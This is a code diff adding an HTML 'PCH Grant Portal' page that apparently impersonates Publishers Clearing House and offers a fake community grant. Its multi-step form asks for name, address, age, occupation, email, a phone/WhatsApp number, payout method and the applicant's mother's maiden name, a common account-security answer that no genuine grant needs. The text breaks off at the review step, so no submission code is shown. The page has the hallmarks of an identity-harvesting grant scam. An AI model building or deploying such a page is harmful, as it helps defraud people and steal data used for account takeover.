@@ -1,0 +1,1854 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PCH Grant Portal — Apply Now</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=Playfair+Display:wght@700&display=swap"
+      rel="stylesheet"
+    />
+    <meta name="description" content="Apply for a PCH Community Investment Grant. Complete a simple 4-step application for financial assistance across the nation." />
+    <style>
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      :root {
+        --navy: #0d1b2a;
+        --navy-mid: #162233;
+        --navy-light: #1e3248;
+        --gold: #d4a017;
+        --gold-light: #f0c040;
+        --blue: #1a73e8;
+        --blue-dark: #1558b0;
+        --green: #34a853;
+        --green-bg: #e6f4ea;
+        --border: #dadce0;
+        --text: #202124;
+        --muted: #5f6368;
+        --bg: #f4f6fb;
+        --white: #ffffff;
+        --error: #d93025;
+        --radius: 10px;
+      }
+
+      html {
+        scroll-behavior: smooth;
+      }
+
+      body {
+        font-family: "DM Sans", sans-serif;
+        background: var(--bg);
+        color: var(--text);
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* ══════════════════════════════════
+       NAVBAR
+    ══════════════════════════════════ */
+      .navbar {
+        background: var(--navy);
+        padding: 0 24px;
+        position: sticky;
+        top: 0;
+        z-index: 50;
+        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.35);
+      }
+
+      .nav-inner {
+        max-width: 900px;
+        margin: 0 auto;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        height: 64px;
+      }
+
+      .nav-brand {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        text-decoration: none;
+      }
+
+      .nav-brand .shield {
+        width: 36px;
+        height: 36px;
+      }
+
+      .nav-brand .brand-text {
+        display: flex;
+        flex-direction: column;
+        line-height: 1.1;
+      }
+
+      .nav-brand .brand-name {
+        font-family: "Playfair Display", serif;
+        font-size: 18px;
+        color: var(--white);
+        letter-spacing: 0.02em;
+      }
+
+      .nav-brand .brand-sub {
+        font-size: 10px;
+        color: var(--gold);
+        text-transform: uppercase;
+        letter-spacing: 0.12em;
+        font-weight: 500;
+      }
+
+      .nav-cta {
+        background: var(--gold);
+        color: var(--navy);
+        padding: 7px 18px;
+        border-radius: 6px;
+        font-weight: 600;
+        font-size: 13px;
+        text-decoration: none;
+        transition: background 0.2s;
+      }
+
+      .nav-cta:hover {
+        background: var(--gold-light);
+      }
+
+      /* ══════════════════════════════════
+       HERO BANNER
+    ══════════════════════════════════ */
+      .hero {
+        background: linear-gradient(
+          135deg,
+          var(--navy) 0%,
+          var(--navy-mid) 60%,
+          #1a2f47 100%
+        );
+        padding: 52px 24px 56px;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .hero::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: radial-gradient(
+          ellipse at 70% 50%,
+          rgba(212, 160, 23, 0.08) 0%,
+          transparent 60%
+        );
+        pointer-events: none;
+      }
+
+      .hero-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background: rgba(212, 160, 23, 0.15);
+        border: 1px solid rgba(212, 160, 23, 0.35);
+        color: var(--gold-light);
+        font-size: 11.5px;
+        font-weight: 600;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        padding: 5px 14px;
+        border-radius: 99px;
+        margin-bottom: 18px;
+      }
+
+      .hero h1 {
+        font-family: "Playfair Display", serif;
+        font-size: clamp(26px, 4vw, 40px);
+        color: var(--white);
+        margin-bottom: 14px;
+        line-height: 1.2;
+        max-width: 640px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .hero p {
+        font-size: 15px;
+        color: rgba(255, 255, 255, 0.7);
+        max-width: 520px;
+        margin: 0 auto;
+        line-height: 1.7;
+      }
+
+      .hero-stats {
+        display: flex;
+        justify-content: center;
+        gap: 36px;
+        margin-top: 32px;
+      }
+
+      .hero-stat {
+        text-align: center;
+      }
+
+      .hero-stat .stat-num {
+        font-family: "Playfair Display", serif;
+        font-size: 24px;
+        color: var(--gold-light);
+        display: block;
+      }
+
+      .hero-stat .stat-lbl {
+        font-size: 11px;
+        color: rgba(255, 255, 255, 0.5);
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        margin-top: 2px;
+      }
+
+      /* ══════════════════════════════════
+       MAIN CONTENT
+    ══════════════════════════════════ */
+      .main {
+        flex: 1;
+        padding: 40px 16px 60px;
+      }
+
+      .form-wrapper {
+        max-width: 680px;
+        margin: 0 auto;
+      }
+
+      /* ── Header Card ── */
+      .header-card {
+        background: var(--white);
+        border-radius: var(--radius);
+        border-top: 6px solid var(--gold);
+        padding: 28px 32px 22px;
+        margin-bottom: 16px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.07);
+      }
+
+      .header-card h2 {
+        font-family: "Playfair Display", serif;
+        font-size: 22px;
+        color: var(--navy);
+        margin-bottom: 8px;
+      }
+
+      .header-card p {
+        font-size: 13.5px;
+        color: var(--muted);
+        line-height: 1.7;
+      }
+
+      /* ── Progress Card ── */
+      .progress-card {
+        background: var(--white);
+        border-radius: var(--radius);
+        padding: 18px 32px;
+        margin-bottom: 16px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.07);
+      }
+
+      .step-labels {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 10px;
+      }
+
+      .step-label {
+        font-size: 11.5px;
+        color: var(--muted);
+        font-weight: 500;
+        text-align: center;
+        flex: 1;
+        transition: color 0.3s;
+      }
+
+      .step-label.active {
+        color: var(--navy);
+        font-weight: 600;
+      }
+      .step-label.done {
+        color: var(--green);
+      }
+
+      .progress-track {
+        height: 5px;
+        background: #e8eaed;
+        border-radius: 99px;
+        overflow: hidden;
+      }
+
+      .progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, var(--gold), var(--blue));
+        border-radius: 99px;
+        transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        width: 0%;
+      }
+
+      .step-counter {
+        font-size: 11.5px;
+        color: var(--muted);
+        margin-top: 8px;
+        text-align: right;
+      }
+
+      /* ── Section Card ── */
+      .section-card {
+        background: var(--white);
+        border-radius: var(--radius);
+        padding: 28px 32px;
+        margin-bottom: 16px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.07);
+      }
+
+      /* ── Step Panels ── */
+      .step-panel {
+        display: none;
+        animation: slideIn 0.3s ease;
+      }
+      .step-panel.active {
+        display: block;
+      }
+
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translateX(18px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(0);
+        }
+      }
+
+      .step-heading {
+        font-family: "Playfair Display", serif;
+        font-size: 17px;
+        color: var(--navy);
+        margin-bottom: 6px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .step-heading svg {
+        width: 20px;
+        height: 20px;
+        fill: var(--gold);
+        flex-shrink: 0;
+      }
+
+      .step-desc {
+        font-size: 13px;
+        color: var(--muted);
+        margin-bottom: 24px;
+        padding-bottom: 16px;
+        border-bottom: 1px solid #f0f0f0;
+      }
+
+      /* ── Fields ── */
+      .field-group {
+        margin-bottom: 20px;
+      }
+      .field-group:last-child {
+        margin-bottom: 0;
+      }
+
+      .field-row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+      }
+
+      label {
+        display: block;
+        font-size: 13px;
+        font-weight: 500;
+        color: var(--muted);
+        margin-bottom: 6px;
+      }
+
+      label .req {
+        color: var(--error);
+        margin-left: 2px;
+      }
+
+      input[type="text"],
+      input[type="email"],
+      input[type="tel"],
+      input[type="number"],
+      select,
+      textarea {
+        width: 100%;
+        border: 1.5px solid var(--border);
+        border-radius: 7px;
+        padding: 10px 12px;
+        font-size: 13.5px;
+        font-family: "DM Sans", sans-serif;
+        color: var(--text);
+        background: #fff;
+        outline: none;
+        transition:
+          border-color 0.2s,
+          box-shadow 0.2s;
+        appearance: none;
+      }
+
+      input:focus,
+      select:focus,
+      textarea:focus {
+        border-color: var(--gold);
+        box-shadow: 0 0 0 3px rgba(212, 160, 23, 0.12);
+      }
+
+      input.invalid,
+      select.invalid,
+      textarea.invalid {
+        border-color: var(--error);
+        box-shadow: 0 0 0 3px rgba(217, 48, 37, 0.1);
+      }
+
+      .error-msg {
+        font-size: 11.5px;
+        color: var(--error);
+        margin-top: 4px;
+        display: none;
+      }
+
+      .error-msg.show {
+        display: block;
+      }
+
+      textarea {
+        resize: vertical;
+        min-height: 80px;
+      }
+
+      select {
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%235f6368' d='M1 1l5 5 5-5'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 12px center;
+        padding-right: 32px;
+      }
+
+      /* ── Radio / Checkbox ── */
+      .radio-group,
+      .checkbox-group {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        margin-top: 6px;
+      }
+
+      .radio-option,
+      .checkbox-option {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        cursor: pointer;
+        font-size: 13.5px;
+        color: var(--text);
+        padding: 10px 14px;
+        border: 1.5px solid var(--border);
+        border-radius: 7px;
+        transition:
+          border-color 0.2s,
+          background 0.2s;
+      }
+
+      .radio-option:hover,
+      .checkbox-option:hover {
+        border-color: var(--gold);
+        background: #fdf8ee;
+      }
+
+      .radio-option input[type="radio"],
+      .checkbox-option input[type="checkbox"] {
+        width: 17px;
+        height: 17px;
+        accent-color: var(--gold);
+        cursor: pointer;
+        flex-shrink: 0;
+      }
+
+      /* ── Nav Buttons ── */
+      .nav-card {
+        background: var(--white);
+        border-radius: var(--radius);
+        padding: 16px 32px;
+        margin-bottom: 16px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.07);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .btn {
+        border: none;
+        border-radius: 7px;
+        padding: 11px 28px;
+        font-size: 14px;
+        font-family: "DM Sans", sans-serif;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+      }
+
+      .btn-back {
+        background: none;
+        color: var(--muted);
+        border: 1.5px solid var(--border);
+      }
+
+      .btn-back:hover {
+        background: #f8f9fa;
+        color: var(--text);
+      }
+
+      .btn-next {
+        background: var(--navy);
+        color: #fff;
+      }
+
+      .btn-next:hover {
+        background: var(--navy-light);
+      }
+
+      .btn-submit {
+        background: var(--green);
+        color: #fff;
+      }
+
+      .btn-submit:hover {
+        background: #2d924a;
+      }
+
+      /* ── Review Panel ── */
+      .review-section {
+        margin-bottom: 22px;
+      }
+
+      .review-title {
+        font-size: 11px;
+        font-weight: 700;
+        color: var(--gold);
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+        margin-bottom: 10px;
+        padding-bottom: 6px;
+        border-bottom: 1.5px solid #f0f0f0;
+      }
+
+      .review-row {
+        display: flex;
+        gap: 8px;
+        padding: 8px 0;
+        border-bottom: 1px solid #f7f7f7;
+        font-size: 13.5px;
+      }
+
+      .review-row:last-child {
+        border-bottom: none;
+      }
+      .review-key {
+        color: var(--muted);
+        min-width: 150px;
+        flex-shrink: 0;
+      }
+      .review-val {
+        color: var(--text);
+        font-weight: 500;
+        word-break: break-word;
+      }
+
+      /* ── Form Footer ── */
+      .form-footer {
+        text-align: center;
+        font-size: 12px;
+        color: var(--muted);
+      }
+
+      .form-footer a {
+        color: var(--blue);
+        text-decoration: none;
+      }
+      .form-footer a:hover {
+        text-decoration: underline;
+      }
+
+      /* ══════════════════════════════════
+       SUCCESS OVERLAY  (Image 2 style)
+    ══════════════════════════════════ */
+      .success-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 200;
+        align-items: center;
+        justify-content: center;
+        padding: 16px;
+        animation: fadeIn 0.3s ease;
+      }
+
+      .success-overlay.show {
+        display: flex;
+      }
+
+      .success-box {
+        background: #fff;
+        border-radius: 16px;
+        padding: 48px 36px 36px;
+        max-width: 420px;
+        width: 100%;
+        text-align: center;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+        animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      }
+
+      .success-icon {
+        width: 72px;
+        height: 72px;
+        background: var(--green-bg);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 22px;
+      }
+
+      .success-icon svg {
+        width: 36px;
+        height: 36px;
+        fill: var(--green);
+      }
+
+      .success-box h2 {
+        font-family: "Playfair Display", serif;
+        font-size: 22px;
+        color: var(--text);
+        margin-bottom: 12px;
+        line-height: 1.3;
+      }
+
+      .success-box p {
+        font-size: 14.5px;
+        color: var(--muted);
+        line-height: 1.75;
+        margin-bottom: 24px;
+      }
+
+      .success-box p strong {
+        color: var(--navy);
+      }
+
+      .reference-box {
+        background: #f4f6fb;
+        border: 1.5px solid #e0e4ef;
+        border-radius: 10px;
+        padding: 16px 20px;
+        margin-bottom: 28px;
+        text-align: left;
+      }
+
+      .reference-label {
+        font-size: 10px;
+        font-weight: 700;
+        color: var(--muted);
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+        margin-bottom: 6px;
+      }
+
+      .reference-number {
+        font-family: "DM Sans", sans-serif;
+        font-size: 22px;
+        font-weight: 700;
+        color: var(--navy);
+        letter-spacing: 0.04em;
+      }
+
+      .btn-close-success {
+        display: block;
+        width: 100%;
+        background: var(--blue);
+        color: #fff;
+        border: none;
+        border-radius: 9px;
+        padding: 14px;
+        font-size: 15px;
+        font-family: "DM Sans", sans-serif;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+      }
+
+      .btn-close-success:hover {
+        background: var(--blue-dark);
+      }
+
+      /* ══════════════════════════════════
+       FOOTER  (Image 1 style)
+    ══════════════════════════════════ */
+      .site-footer {
+        background: var(--navy);
+        color: rgba(255, 255, 255, 0.75);
+        padding: 52px 24px 0;
+      }
+
+      .footer-inner {
+        max-width: 900px;
+        margin: 0 auto;
+      }
+
+      .footer-top {
+        display: grid;
+        grid-template-columns: 1.6fr 1fr 1fr;
+        gap: 40px;
+        padding-bottom: 44px;
+      }
+
+      /* Brand column */
+      .footer-brand .brand-row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 16px;
+      }
+
+      .footer-brand .brand-name {
+        font-family: "Playfair Display", serif;
+        font-size: 20px;
+        color: var(--white);
+      }
+
+      .footer-brand .brand-sub {
+        font-size: 11px;
+        color: var(--gold);
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+      }
+
+      .footer-brand p {
+        font-size: 13.5px;
+        line-height: 1.8;
+        color: rgba(255, 255, 255, 0.6);
+      }
+
+      /* Link columns */
+      .footer-col h4 {
+        font-size: 11px;
+        font-weight: 700;
+        color: var(--gold);
+        text-transform: uppercase;
+        letter-spacing: 0.12em;
+        margin-bottom: 18px;
+      }
+
+      .footer-col ul {
+        list-style: none;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .footer-col ul li a {
+        color: rgba(255, 255, 255, 0.65);
+        text-decoration: none;
+        font-size: 14px;
+        transition: color 0.2s;
+      }
+
+      .footer-col ul li a:hover {
+        color: var(--gold-light);
+      }
+
+      /* Contact column */
+      .footer-contact h4 {
+        font-size: 11px;
+        font-weight: 700;
+        color: var(--gold);
+        text-transform: uppercase;
+        letter-spacing: 0.12em;
+        margin-bottom: 18px;
+      }
+
+      .contact-item {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        margin-bottom: 14px;
+        font-size: 13.5px;
+        color: rgba(255, 255, 255, 0.65);
+      }
+
+      .contact-item svg {
+        width: 16px;
+        height: 16px;
+        fill: var(--gold);
+        flex-shrink: 0;
+        margin-top: 2px;
+      }
+
+      /* Footer bottom */
+      .footer-bottom {
+        border-top: 1px solid rgba(255, 255, 255, 0.08);
+        padding: 18px 0;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        gap: 8px;
+      }
+
+      .footer-bottom p {
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.4);
+      }
+
+      .footer-bottom-links {
+        display: flex;
+        gap: 20px;
+      }
+
+      .footer-bottom-links a {
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.45);
+        text-decoration: none;
+        transition: color 0.2s;
+      }
+
+      .footer-bottom-links a:hover {
+        color: var(--gold-light);
+      }
+
+      /* ── Animations ── */
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+      @keyframes popIn {
+        from {
+          transform: scale(0.82);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+
+      /* ── 3-column field row ── */
+      .field-row-3 {
+        grid-template-columns: 1fr 1fr 1fr;
+      }
+
+      /* ── Fieldset reset (for radio/checkbox groups) ── */
+      fieldset.field-group {
+        border: none;
+        padding: 0;
+        margin: 0;
+      }
+
+      fieldset.field-group legend {
+        font-size: 13px;
+        font-weight: 500;
+        color: var(--muted);
+        margin-bottom: 6px;
+        padding: 0;
+        float: left;
+        width: 100%;
+      }
+
+      /* ── Responsive ── */
+
+      /* Tablet (≤ 768px) */
+      @media (max-width: 768px) {
+        .hero {
+          padding: 36px 20px 40px;
+        }
+
+        .hero-stats {
+          gap: 20px;
+        }
+
+        .footer-top {
+          grid-template-columns: 1fr 1fr;
+          gap: 32px;
+        }
+
+        .main {
+          padding: 28px 16px 48px;
+        }
+      }
+
+      /* Mobile (≤ 640px) */
+      @media (max-width: 640px) {
+        .nav-inner {
+          height: 56px;
+        }
+
+        .nav-brand .brand-name {
+          font-size: 16px;
+        }
+
+        .hero {
+          padding: 28px 16px 32px;
+        }
+
+        .hero-stats {
+          gap: 16px;
+          flex-wrap: wrap;
+          justify-content: center;
+        }
+
+        .hero-stat {
+          min-width: 80px;
+        }
+
+        .hero-stat .stat-num {
+          font-size: 20px;
+        }
+
+        .header-card,
+        .section-card,
+        .nav-card,
+        .progress-card {
+          padding: 18px 16px;
+        }
+
+        .field-row,
+        .field-row-3 {
+          grid-template-columns: 1fr;
+        }
+
+        .step-label {
+          font-size: 10px;
+        }
+
+        .review-key {
+          min-width: 110px;
+        }
+
+        .footer-top {
+          grid-template-columns: 1fr;
+          gap: 28px;
+          padding-bottom: 28px;
+        }
+
+        .footer-bottom {
+          flex-direction: column;
+          align-items: flex-start;
+          gap: 12px;
+        }
+
+        .btn {
+          padding: 11px 20px;
+          font-size: 13px;
+        }
+      }
+
+      /* Small mobile (≤ 480px) */
+      @media (max-width: 480px) {
+        .nav-brand .brand-sub {
+          display: none;
+        }
+
+        .hero {
+          padding: 24px 14px 28px;
+        }
+
+        .main {
+          padding: 20px 12px 40px;
+        }
+
+        .hero-stats {
+          gap: 12px;
+        }
+
+        .success-box {
+          padding: 36px 20px 28px;
+        }
+
+        .reference-number {
+          font-size: 19px;
+        }
+
+        .review-row {
+          flex-direction: column;
+          gap: 2px;
+        }
+
+        .review-key {
+          min-width: unset;
+        }
+
+        .nav-card {
+          padding: 12px 14px;
+        }
+
+        .btn {
+          padding: 10px 16px;
+          font-size: 13px;
+        }
+
+        .step-label {
+          font-size: 9px;
+          letter-spacing: 0;
+        }
+      }
+
+      /* Very small phones (≤ 360px) */
+      @media (max-width: 360px) {
+        .navbar {
+          padding: 0 12px;
+        }
+
+        .hero-stats {
+          flex-direction: column;
+          align-items: center;
+          gap: 8px;
+        }
+
+        .step-label {
+          font-size: 8.5px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- ══ NAVBAR ══ -->
+    <nav class="navbar">
+      <div class="nav-inner">
+        <a href="#" class="nav-brand">
+          <!-- PCH Shield SVG -->
+          <svg
+            class="shield"
+            viewBox="0 0 40 44"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <path
+              d="M20 2L4 8v14c0 10 7 18.5 16 21 9-2.5 16-11 16-21V8L20 2z"
+              fill="#d4a017"
+              opacity="0.15"
+            />
+            <path
+              d="M20 2L4 8v14c0 10 7 18.5 16 21 9-2.5 16-11 16-21V8L20 2z"
+              stroke="#d4a017"
+              stroke-width="2"
+              fill="none"
+            />
+            <path
+              d="M13 21.5l5 5 9-10"
+              stroke="#d4a017"
+              stroke-width="2.5"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            />
+          </svg>
+          <div class="brand-text">
+            <span class="brand-name">PCH</span>
+            <span class="brand-sub">Grant Portal</span>
+          </div>
+        </a>
+        <a href="#form-section" class="nav-cta">Apply Now</a>
+      </div>
+    </nav>
+
+    <!-- ══ MAIN / FORM ══ -->
+    <main class="main" id="form-section">
+      <div class="form-wrapper">
+        <!-- Header Card -->
+        <div class="header-card">
+          <h2>PCH Application Requirements Form</h2>
+          <p>
+            Please fill out this form completely and accurately. Your
+            information will be used to verify your eligibility and process your
+            grant.<br /><br />
+            Complete the form in 4 simple steps. All required fields are marked
+            with <span style="color: var(--error)">*</span>
+          </p>
+        </div>
+
+        <!-- Progress -->
+        <div class="progress-card">
+          <div class="step-labels">
+            <span class="step-label active" id="lbl1">Personal Info</span>
+            <span class="step-label" id="lbl2">Contact Details</span>
+            <span class="step-label" id="lbl3">Preferences</span>
+            <span class="step-label" id="lbl4">Review</span>
+          </div>
+          <div class="progress-track" role="progressbar" aria-valuemin="1" aria-valuemax="4" aria-valuenow="1" aria-label="Application progress">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+          <div class="step-counter" id="stepCounter">Step 1 of 4</div>
+        </div>
+
+        <!-- ════ STEP 1 — Personal Info ════ -->
+        <div class="section-card">
+          <div class="step-panel active" id="step1">
+            <div class="step-heading">
+              <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                <path
+                  d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"
+                />
+              </svg>
+              Personal Information
+            </div>
+            <p class="step-desc">Tell us a little about yourself.</p>
+
+            <div class="field-row">
+              <div class="field-group">
+                <label for="firstName"
+                  >Full Name <span class="req">*</span></label
+                >
+                <input
+                  type="text"
+                  id="firstName"
+                  placeholder="e.g. John Smith"
+                />
+                <div class="error-msg" role="alert" id="err-firstName">
+                  Please enter your full name.
+                </div>
+              </div>
+              <div class="field-group">
+                <label for="address1"
+                  >Full Address <span class="req">*</span></label
+                >
+                <input
+                  type="text"
+                  id="address1"
+                  placeholder="570 Ann Street, Bronx, NY 10451"
+                />
+                <div class="error-msg" role="alert" id="err-address1">
+                  Please enter your full address.
+                </div>
+              </div>
+            </div>
+
+            <div class="field-row field-row-3">
+              <div class="field-group">
+                <label for="maiden"
+                  >Mother's Maiden Name <span class="req">*</span></label
+                >
+                <input type="text" id="maiden" placeholder="e.g. Jane" />
+                <div class="error-msg" role="alert" id="err-maiden">
+                  Enter mother's maiden name.
+                </div>
+              </div>
+              <div class="field-group">
+                <label for="age">Age <span class="req">*</span></label>
+                <input
+                  type="number"
+                  id="age"
+                  placeholder="e.g. 35"
+                  min="1"
+                  max="120"
+                />
+                <div class="error-msg" role="alert" id="err-age">Enter a valid age.</div>
+              </div>
+              <div class="field-group">
+                <label for="sex">Gender <span class="req">*</span></label>
+                <select id="sex">
+                  <option value="" disabled selected>Select</option>
+                  <option>Male</option>
+                  <option>Female</option>
+                  <option>Prefer not to say</option>
+                </select>
+                <div class="error-msg" role="alert" id="err-sex">
+                  Please select your gender.
+                </div>
+              </div>
+            </div>
+
+            <div class="field-row">
+              <div class="field-group">
+                <label for="marital">Marital Status</label>
+                <select id="marital">
+                  <option value="" disabled selected>Select</option>
+                  <option>Single</option>
+                  <option>Married</option>
+                  <option>Divorced</option>
+                  <option>Widowed</option>
+                </select>
+              </div>
+              <div class="field-group">
+                <label for="occupation"
+                  >Occupation <span class="req">*</span></label
+                >
+                <input type="text" id="occupation" placeholder="e.g. Teacher" />
+                <div class="error-msg" role="alert" id="err-occupation">
+                  Please enter your occupation.
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ════ STEP 2 — Contact Details ════ -->
+        <div class="section-card" style="display: none" id="card2" aria-hidden="true">
+          <div class="step-panel" id="step2">
+            <div class="step-heading">
+              <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                <path
+                  d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"
+                />
+              </svg>
+              Contact Details
+            </div>
+            <p class="step-desc">How can we reach you?</p>
+
+            <div class="field-group">
+              <label for="email"
+                >Email Address <span class="req">*</span></label
+              >
+              <input
+                type="email"
+                id="email"
+                placeholder="e.g. john@example.com"
+              />
+              <div class="error-msg" role="alert" id="err-email">
+                Please enter a valid email address.
+              </div>
+            </div>
+
+            <div class="field-group">
+              <label for="phone"
+                >Phone / WhatsApp Number <span class="req">*</span></label
+              >
+              <input type="tel" id="phone" placeholder="e.g. +1 800 000 0000" />
+              <div class="error-msg" role="alert" id="err-phone">
+                Please enter your phone number.
+              </div>
+            </div>
+
+            <div class="field-group">
+              <label for="address"
+                >Full Address <span class="req">*</span></label
+              >
+              <textarea
+                id="address"
+                placeholder="Street, City, State, Country"
+              ></textarea>
+              <div class="error-msg" role="alert" id="err-address">
+                Please enter your address.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ════ STEP 3 — Preferences ════ -->
+        <div class="section-card" style="display: none" id="card3" aria-hidden="true">
+          <div class="step-panel" id="step3">
+            <div class="step-heading">
+              <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                <path
+                  d="M17 12h-5v5h5v-5zM16 1v2H8V1H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-1V1h-2zm3 18H5V8h14v11z"
+                />
+              </svg>
+              Grant Type & Preferences
+            </div>
+            <p class="step-desc">Help us match you with the right grant.</p>
+
+            <fieldset class="field-group">
+              <legend>Preferred Payment Method <span class="req">*</span></legend>
+              <div class="radio-group">
+                <label class="radio-option">
+                  <input type="radio" name="session" value="Payment (Cash)" />
+                  Cash
+                </label>
+                <label class="radio-option">
+                  <input type="radio" name="session" value="Payment (Check)" />
+                  Check
+                </label>
+                <label class="radio-option">
+                  <input
+                    type="radio"
+                    name="session"
+                    value="Payment (Bank Transfer)"
+                  />
+                  Bank Transfer
+                </label>
+                <label class="radio-option">
+                  <input
+                    type="radio"
+                    name="session"
+                    value="Payment (Money Order)"
+                  />
+                  Money Order
+                </label>
+              </div>
+              <div class="error-msg" role="alert" id="err-session">
+                Please select a payment method.
+              </div>
+            </fieldset>
+
+            <fieldset class="field-group">
+              <legend>How did you hear about us?</legend>
+              <div class="checkbox-group">
+                <label class="checkbox-option"
+                  ><input
+                    type="checkbox"
+                    name="referral"
+                    value="Social Media"
+                  />
+                  Social Media</label
+                >
+                <label class="checkbox-option"
+                  ><input
+                    type="checkbox"
+                    name="referral"
+                    value="Friend / Family"
+                  />
+                  Friend / Family</label
+                >
+                <label class="checkbox-option"
+                  ><input
+                    type="checkbox"
+                    name="referral"
+                    value="Email Newsletter"
+                  />
+                  Email Newsletter</label
+                >
+                <label class="checkbox-option"
+                  ><input
+                    type="checkbox"
+                    name="referral"
+                    value="Website / Search"
+                  />
+                  Website / Search</label
+                >
+              </div>
+            </fieldset>
+
+            <div class="field-group">
+              <label for="comments">Additional Comments</label>
+              <textarea
+                id="comments"
+                placeholder="Anything you'd like us to know..."
+              ></textarea>
+            </div>
+          </div>
+        </div>
+
+        <!-- ════ STEP 4 — Review ════ -->
+        <div class="section-card" style="display: none" id="card4" aria-hidden="true">
+          <div class="step-panel" id="step4">
+            <div class="step-heading">
+              <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                <path
+                  d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"
+                />
+              </svg>
+              Review Your Information
+            </div>
+            <p class="step-desc">
+              Please confirm your details before submitting.
+            </p>
+
+            <div class="review-section">
+              <div class="review-title">Personal Info</div>
+              <div class="review-row">
+                <span class="review-key">Full Name</span
+                ><span class="review-val" id="r-name">—</span>
+              </div>
+              <div class="review-row">
+                <span class="review-key">Age</span
+                ><span class="review-val" id="r-age">—</span>
+              </div>
+              <div class="review-row">
+                <span class="review-key">Gender</span
+                ><span class="review-val" id="r-sex">—</span>
+              </div>
+              <div class="review-row">
+                <span class="review-key">Marital Status</span
+                ><span class="review-val" id="r-marital">—</span>
+              </div>
+              <div class="review-row">
+                <span class="review-key">Occupation</span
+                ><span class="review-val" id="r-occupation">—</span>
+              </div>
+            </div>
+
+            <div class="review-section">
+              <div class="review-title">Contact Details</div>
+              <div class="review-row">
+                <span class="review-key">Email</span
+                ><span class="review-val" id="r-email">—</span>
+              </div>
+              <div class="review-row">
+                <span class="review-key">Phone</span
+                ><span class="review-val" id="r-phone">—</span>
+              </div>
+              <div class="review-row">
+                <span class="review-key">Address</span
+                ><span class="review-val" id="r-address">—</span>
+              </div>
+            </div>
+
+            <div class="review-section">
+              <div class="review-title">Preferences</div>
+              <div class="review-row">
+                <span class="review-key">Payment Method</span
+                ><span class="review-val" id="r-session">—</span>
